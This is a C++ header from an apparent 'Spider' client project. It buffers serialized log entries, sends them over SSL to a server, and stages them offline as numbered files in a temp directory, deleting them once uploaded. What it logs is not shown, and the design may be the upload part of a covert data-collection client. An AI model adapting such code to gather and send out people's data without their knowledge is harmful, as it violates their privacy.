//
// Created by roman sztergbaum on 28/09/2017.
//

#ifndef SPIDER_CLIENT_LOGHANDLE_HPP
#define SPIDER_CLIENT_LOGHANDLE_HPP

#include <fstream>
#include <string_view>
#include <boost/bind.hpp>
#include <boost/asio/buffer.hpp>
#include <boost/filesystem.hpp>
#include <log/Logger.hpp>
#include <Network/ClientSession.hpp>
#include <Network/SSLConnection.hpp>
#include <Network/ErrorCode.hpp>
#include <Protocol/CommandHandler.hpp>
#include <Logging/AbstractLogHandle.hpp>
#include <Configuration.hpp>

namespace fs = boost::filesystem;

namespace spi
{
    class LogHandle : public AbstractLogHandle
    {
    public:

        LogHandle(const cfg::Config &conf, net::SSLContext &ctx) noexcept :
            _conf(conf),
            _ctx(ctx),
            _baseDir(fs::temp_directory_path() / _conf.logDir)
        {
        }

        ~LogHandle() noexcept override
        {
            _log(logging::Info) << "Shutting down..." << std::endl;
            if (isConnectionValid)
                _clientSession->close();
        }

        bool setup() noexcept override
        {
            if (_io == nullptr) {
                _log(logging::Error) << "No IOManager set" << std::endl;
                _log(logging::Error) << "Setup Failed" << std::endl;
                return false;
            }
            if (!fs::exists(_baseDir) && !fs::create_directories(_baseDir)) {
                _log(logging::Error) << "Unable to create Local Log Directory : " << _baseDir.string() << std::endl;
                _log(logging::Error) << "Setup Failed" << std::endl;
                return false;
            }
            _clientSession = std::make_unique<ClientSession>(_ctx, *_io, _conf);
            _clientSession->onConnectSuccess(boost::bind(&LogHandle::__onConnectionSuccess, this));
            _clientSession->onConnectFailure(boost::bind(&LogHandle::__onConnectionFailure, this));
            tryConnection();
            _timer = std::make_unique<net::Timer>(*_io, _conf.retryTime);
            _log(logging::Info) << "Setup successfully" << std::endl;
            return true;
        }

        always_inline void tryConnection() noexcept
        {
            _clientSession->connect();
        }

        void disconnect()
        {
            _log(logging::Info) << "Disconnecting" << std::endl;
            isConnectionValid = false;
            _clientSession->close();
            _fileNb = __getFileNb() - 1;
            rotate();
        }

        void appendEntry(const ILoggable &loggable) override
        {
            loggable.serializeTypeInfo(_buffer);
            loggable.serialize(_buffer);
            if (_buffer.size() >= _bufferMax)
                flush();
        }

        void flush() override
        {
            _log(logging::Info) << "Flushing" << std::endl;
            if (isConnectionValid) {
                if (_buffer.size() > 0)
                    _clientSession->getConnection().asyncWriteSome(_buffer, boost::bind(&LogHandle::__handleWrite,
                                                                                        this, net::ErrorPlaceholder));
                __scheduleFlush(_conf.retryTime);
            } else {
                if (_logWritten + _buffer.size() > _fileMax) {
                    rotate();
                }
                if (_buffer.size() > 0) {
                    _logWritten += _buffer.size();
                    _out.write(reinterpret_cast<const char *>(_buffer.data()), _buffer.size());
                    _out.flush();
                    _buffer.clear();
                }
            }
        }

        void rotate()
        {
            if (_out.is_open())
                _out.close();
            _fileNb += 1;
            fs::path outPath = std::move((_baseDir / std::to_string(_fileNb)).replace_extension("spi"));
            _out.open(outPath.string(), std::ios_base::binary);
            _logWritten = 0;
        }

        void setRoot([[maybe_unused]] const std::string &) noexcept override
        {
        }

        void setID([[maybe_unused]] const std::string &) noexcept override
        {
        }

        // need to be set before calling the setup
        void setIOManager(net::IOManager &ioManager) noexcept override
        {
            _io = &ioManager;
        }

    private:
        void __flushLocal()
        {
            std::vector<fs::path> files;
            std::vector<char> socketFlusher;
            std::ifstream in;

            socketFlusher.resize(_fileMax);
            fs::directory_iterator end;
            for (fs::directory_iterator it(_baseDir); it != end; ++it) {
                if (fs::exists(it->path()) && fs::is_regular_file(it->path())
                    && it->path().extension().string() == ".spi") {
                    try {
                        auto n [[maybe_unused]] = std::stoul(it->path().stem().string());
                        files.push_back(it->path());
                    } catch (const std::exception &e) {
                    }
                }
            }
            std::sort(files.begin(), files.end());

            for (const auto &path : files) {
                if (!isConnectionValid)
                    break;
                try {
                    if (fs::exists(path) && fs::is_regular_file(path)) {
                        in.open(path.string(), std::ios_base::binary | std::ios_base::ate);
                        if (in.good()) {
                            auto pos = in.tellg();
                            if (_fileMax < static_cast<unsigned long>(pos)) {
                                // should normally never happen because the buffer is supposedly limited to _fileMax
                                socketFlusher.resize(static_cast<unsigned long>(pos));
                            }
                            in.seekg(0, std::ios_base::beg);
                            in.read(socketFlusher.data(), pos);
                            in.close();
                            ErrorCode ec;
                            _clientSession->getConnection().writeSome(net::BufferView(socketFlusher.data(),
                                                                                      static_cast<size_t>(pos)), ec);
                            socketFlusher.clear();
                        }
                        std::remove(path.string().c_str());
                    }
                } catch (const std::exception &e) {
                    _log(logging::Warning) << "Unable to flush " << path << ": " << e.what() << std::endl;
                }
            }
            _log(logging::Debug) << "Flushed " << files.size() << " local files" << std::endl;
        }

        void __handleWrite(const ErrorCode &err)
        {
            if (!err) {
                _log(logging::Debug) << "Data successfully sent to server" << std::endl;
                _buffer.clear();
            } else {
                _log(logging::Warning) << "Unable to send data to server: " << err.message() << std::endl;
                disconnect();
                tryConnection();
            }
        }

        unsigned long __getFileNb() const noexcept
        {
            unsigned long max = 0;
            bool looped = false;

            fs::directory_iterator end;
            for (fs::directory_iterator it(_baseDir); it != end; ++it) {
                try {
                    auto n = std::stoul(it->path().stem().string());
                    if (max <= n) {
                        looped = true;
                        max = n;
                    }
                } catch (const std::exception &e) {
                }
            }
            return looped ? max + 1 : 0;
        }

        void __onConnectionSuccess()
        {
            isConnectionValid = true;
            _log(logging::Info) << "Connected" << std::endl;
            __flushLocal();
            __scheduleFlush(_conf.retryTime);
        }

        void __onConnectionFailure()
        {
            _log(logging::Info) << "Connection Failed" << std::endl;
            isConnectionValid = false;
            _fileNb = __getFileNb() - 1;
            rotate();
        }

        void __scheduleFlush(long seconds) noexcept
        {
            _timer->setExpiry(seconds);
            _timer->asyncWait(boost::bind(&LogHandle::__handleFlush, this, net::ErrorPlaceholder));
        }

        void __handleFlush(const ErrorCode &err)
        {
            if (!err)
                flush();
            else
                _log(logging::Warning) << "Unable to schedule an upcoming flush: " << err.message() << std::endl;
        }

    private:
        logging::Logger _log{"spider-log-handle", logging::Level::Debug};

        const cfg::Config &_conf;

        Buffer _buffer{};

        net::IOManager *_io{nullptr};
        net::SSLContext &_ctx;
        std::unique_ptr<ClientSession> _clientSession;
        bool isConnectionValid{false};

        std::unique_ptr<net::Timer> _timer;

        fs::path _baseDir;
        std::ofstream _out;
        unsigned long _fileNb;
        unsigned long _logWritten;

        static constexpr const unsigned long _bufferMax = 256;
        static constexpr const unsigned long _fileMax = 4096;
    };
}

#endif //SPIDER_CLIENT_LOGHANDLE_HPP